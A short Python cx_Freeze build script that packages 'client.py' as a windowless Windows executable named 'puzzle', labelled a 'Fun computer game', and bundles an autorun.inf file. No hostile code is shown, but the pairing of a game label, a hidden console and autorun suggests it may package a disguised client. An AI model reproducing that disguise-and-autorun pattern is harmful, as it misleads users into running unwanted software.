import sys
from cx_Freeze import setup, Executable


# probably have to install/change to python 3.4


include_files = ['autorun.inf']
base = None

if sys.platform == "win32":
    base = "Win32GUI"

setup(name="puzzle",
      version="0.1",
      description="Fun computer game",
      options={'build_exe': {'include_files': include_files}},
      executables=[Executable("client.py", base=base)])

